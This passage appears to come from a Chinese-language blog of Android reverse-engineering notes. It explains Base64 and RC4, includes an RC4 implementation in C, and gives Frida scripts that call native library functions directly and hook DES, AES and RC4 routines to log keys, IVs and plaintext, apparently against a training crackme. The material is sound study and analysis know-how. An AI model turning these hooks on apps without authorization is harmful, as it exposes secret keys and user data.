<li>原理：使用一个字符（6位bit位）来表示一个8bit的二进制数，(每3个8位的字节转换成4个6位的字节)。可能回出现填充(“&#x3D;”)，当要编码的数据不是三的倍数的时候需要再原来的数据后面加上二进制0，空就是”&#x3D;”</li>
</ul>
<h1 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h1><p>主动调用可以使用xposed,也可以使用frida</p>
<p><u><strong>使用frida来对so中的函数进行主动调用：</strong></u></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">activeinvokesub_834</span>(<span class="params">content</span>)&#123;</span><br><span class="line">    <span class="comment">//是thumb指令（指令长度为4），就需要加一</span></span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0x834</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> nativeLibModule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fun_sub_834 = nativeLibModule.<span class="property">base</span>.<span class="title function_">add</span>(offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">10</span>)</span><br><span class="line">    <span class="title function_">ptr</span>(arg0).<span class="title function_">writeUtf8String</span>(content)</span><br><span class="line">    <span class="keyword">var</span> sub_834 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fun_sub_834,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">sub_834</span>(arg0)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">hexdump</span>(result))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="RC4原理"><a href="#RC4原理" class="headerlink" title="RC4原理"></a>RC4原理</h1><p>解密和加密是一样的</p>
<ol>
<li>将**s盒(256字节)**和key进行KSA算法（Key scheduling algorithm）初始化</li>
<li>然后将上面的结果进行PRGA算法运算（pseudo random generation algorithm）伪随机密码生成</li>
<li>产生了密钥流</li>
<li>使用明文和密钥流进行逐字节异或得到密文</li>
<li>使用密文和密钥流进行逐字节XOR得到明文</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        s[i] = i;<span class="comment">//初始化状态向量</span></span><br><span class="line">        k[i] = key[i % Len];<span class="comment">//根据密钥，初始化临时向量</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;<span class="comment">//根据给定密钥，扰乱状态向量</span></span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *Data, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;<span class="comment">//得到新的状态向量</span></span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4Encrypt</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">char</span>* content)</span></span>&#123;</span><br><span class="line">    <span class="comment">//rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Len=<span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">rc4_init</span>(s, (<span class="type">unsigned</span> <span class="type">char</span> *) key, Len);</span><br><span class="line">    <span class="built_in">rc4_crypt</span>(s, content, <span class="built_in">strlen</span>((<span class="type">char</span>*)content));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>特征：</strong></p>
<ol>
<li>S盒长度256字节，并且会有两轮256次的循环对S盒进行扰乱（初始化）</li>
<li>在PRGA处：会出现一个和加密字符相同长度次数的循环，同时也会重新扰乱s盒</li>
</ol>
<h1 id="hooBase64"><a href="#hooBase64" class="headerlink" title="hooBase64"></a>hooBase64</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主动调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activeinvokesub_834</span>(<span class="params">content</span>)&#123;</span><br><span class="line">    <span class="comment">//获取目标函数的地址</span></span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0x834</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> nativeLibModule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fun_sub_834 = nativeLibModule.<span class="property">base</span>.<span class="title function_">add</span>(offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">10</span>)</span><br><span class="line">    <span class="title function_">ptr</span>(arg0).<span class="title function_">writeUtf8String</span>(content)</span><br><span class="line">    <span class="comment">//获取函数对象，新建一个函数对象</span></span><br><span class="line">    <span class="keyword">var</span> sub_834 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fun_sub_834,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">	<span class="comment">//调用函数，注意要传入参数</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">sub_834</span>(arg0)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">hexdump</span>(result))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activeinvokejavafunc1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoadersSync</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span> (<span class="params">classloader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;classloader:&quot;</span>,classloader)</span><br><span class="line">                    <span class="keyword">if</span>(classloader.<span class="title function_">indexOf</span>(<span class="string">&quot;com.kanxue.encrypt01&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        classloader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.kanxue.encrypt01&quot;</span>)</span><br><span class="line">                    	<span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = classloader</span><br><span class="line">                        <span class="comment">//com.kanxue.encrypt01.MainActivity.caicaikan</span></span><br><span class="line">                    	<span class="keyword">var</span> mainActivityclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kanxue.encrypt01.MainActivity&quot;</span>)</span><br><span class="line">                    	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;main:&quot;</span>,mainActivityclazz)</span><br><span class="line">                        </span><br><span class="line">                                                <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.kanxue.encrypt01.MainActivity&quot;</span>, &#123;</span><br><span class="line">                            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance);</span><br><span class="line">                                <span class="keyword">var</span> result = instance.<span class="title function_">caicaikan</span>(content);</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br><span class="line">                            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;search heap complete&#x27;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line">                        </span><br><span class="line">                    &#125;                </span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span>,error)</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(activeinvokejavafunc1)</span><br></pre></td></tr></table></figure>

<h1 id="hookdes"><a href="#hookdes" class="headerlink" title="hookdes"></a>hookdes</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.getInstance is called!&#x27;</span>, arg0);</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(arg0);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//.init(Cipher.ENCRYPT_MODE, getRawKey(key), iv);</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1, arg2</span>) &#123;</span><br><span class="line">            <span class="comment">//console.log(&#x27;javax.crypto.Cipher.init is called!&#x27;, arg0, arg1, arg2);</span></span><br><span class="line">            <span class="keyword">var</span> mode = arg0;</span><br><span class="line">            <span class="keyword">var</span> key = arg1;</span><br><span class="line">            <span class="keyword">var</span> iv = arg2;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">KeyClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.Key&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> keyobj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(key, <span class="title class_">KeyClass</span>);</span><br><span class="line">            <span class="keyword">var</span> key_bytes = keyobj.<span class="title function_">getEncoded</span>();</span><br><span class="line">            <span class="keyword">var</span> keyString = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(key_bytes)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;keyString:&quot;</span>,keyString)</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">IVClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> ivobj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(iv, <span class="title class_">IVClass</span>);</span><br><span class="line">            <span class="keyword">var</span> iv_bytes = ivobj.<span class="title function_">getIV</span>();</span><br><span class="line">            <span class="keyword">var</span> ivString = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(iv_bytes)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ivString:&quot;</span>,ivString)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.init is called!&#x27;</span>, mode, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(key_bytes), <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(iv_bytes));</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">init</span>(arg0, arg1, arg2);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.doFinal is called!&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">            <span class="keyword">var</span> data = arg0;</span><br><span class="line">            <span class="comment">//打印出待加密的字符串</span></span><br><span class="line">            <span class="keyword">var</span> dataString = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(data)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;datastring:&#x27;</span>,dataString)</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(arg0);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.doFinal is called!&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data), <span class="string">&quot;encrypt:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result));</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//doFinal</span></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h1 id="hookRC4"><a href="#hookRC4" class="headerlink" title="hookRC4"></a>hookRC4</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">activeinvokesub_F658</span>(<span class="params">key,content</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0xf658</span></span><br><span class="line">    <span class="keyword">var</span> nativeLibModule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> sub_f658_func = nativeLibModule.<span class="property">base</span>.<span class="title function_">add</span>(offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">10</span>)</span><br><span class="line">    <span class="title function_">ptr</span>(arg0).<span class="title function_">writeUtf8String</span>(key)</span><br><span class="line">    <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">10</span>)</span><br><span class="line">    <span class="title function_">ptr</span>(arg1).<span class="title function_">writeUtf8String</span>(content)</span><br><span class="line">    <span class="keyword">var</span> sub_f658 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(sub_f658_func,<span class="string">&#x27;void&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    <span class="title function_">sub_f658</span>(arg0,arg1)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg0:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg1))</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg0:&quot;</span>,<span class="title function_">hexdump</span>(arg0))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1:&quot;</span>,<span class="title function_">hexdump</span>(arg1))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;==========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">sub_f658</span>(arg0,arg1)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg0:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg1))</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg0:&quot;</span>,<span class="title function_">hexdump</span>(arg0))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1:&quot;</span>,<span class="title function_">hexdump</span>(arg1))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooklibnativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;into hooklibnativelib&#x27;</span>)</span><br><span class="line">    <span class="comment">// sub_F0AC((__int64)&amp;v10, v4, arg0_length);</span></span><br><span class="line">    <span class="comment">// arg1_length = strlen(v5);</span></span><br><span class="line">    <span class="comment">// result = sub_F3C4((__int64)&amp;v10, v5, arg1_length);</span></span><br><span class="line">    <span class="comment">//获得函数的地址 = 基址 + 偏移</span></span><br><span class="line">    <span class="keyword">var</span> nativeLibModule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> sub_F0AC_addr = nativeLibModule.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0xF0AC</span>)</span><br><span class="line">    <span class="keyword">var</span> sub_F3C4_addr = nativeLibModule.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0xF3C4</span>)</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_F0AC_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RC_init  on enter&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key:&quot;</span>,<span class="title function_">hexdump</span>(args[<span class="number">1</span>],args[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RC_init  on leave&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_F3C4_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>];</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RC_encrypt  on enter&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;content:&quot;</span>,<span class="title function_">hexdump</span>(args[<span class="number">1</span>],args[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RC_encrypt  on leave&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;cryptresult:&quot;</span>, <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="property">available</span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;into main&#x27;</span>)</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">RuntimeClazz</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line">            <span class="title class_">RuntimeClazz</span>.<span class="property">loadLibrary0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0,arg1</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">loadLibrary0</span>(arg0,arg1)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (arg1.<span class="title function_">indexOf</span>(<span class="string">&#x27;native-lib&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="title function_">hooklibnativelib</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>

<h1 id="hookAES"><a href="#hookAES" class="headerlink" title="hookAES"></a>hookAES</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookaes</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>).<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//console.log(&#x27;javax.crypto.spec.SecretKeySpec.init is called&#x27;);</span></span><br><span class="line">                    <span class="keyword">if</span> (arg1.<span class="title function_">indexOf</span>(<span class="string">&quot;AES&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;key:&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0), <span class="string">&quot;,algorithm:&quot;</span> + arg1);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(arg0, arg1);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">//.init(Cipher.ENCRYPT_MODE, getRawKey(key), iv);</span></span><br><span class="line">                <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">                    <span class="comment">//console.log(&#x27;javax.crypto.Cipher.init is called!&#x27;, arg0, arg1, arg2);</span></span><br><span class="line">                    <span class="keyword">var</span> mode = arg0;</span><br><span class="line">                    <span class="keyword">var</span> key = arg1;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">SecretKeySpecClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.Key&#x27;</span>);</span><br><span class="line">                    <span class="keyword">var</span> keyobj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(key, <span class="title class_">SecretKeySpecClass</span>);</span><br><span class="line">                    <span class="keyword">var</span> key_bytes = keyobj.<span class="title function_">getEncoded</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.init is called!&#x27;</span>, mode, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(key_bytes));</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">init</span>(arg0, arg1);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.doFinal is called!&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arg0));</span><br><span class="line">                    <span class="keyword">var</span> data = arg0;</span><br><span class="line">                    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(arg0);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;javax.crypto.Cipher.doFinal is called!&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data), <span class="string">&quot;encrypt:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result));</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hookaes);</span><br></pre></td></tr></table></figure>

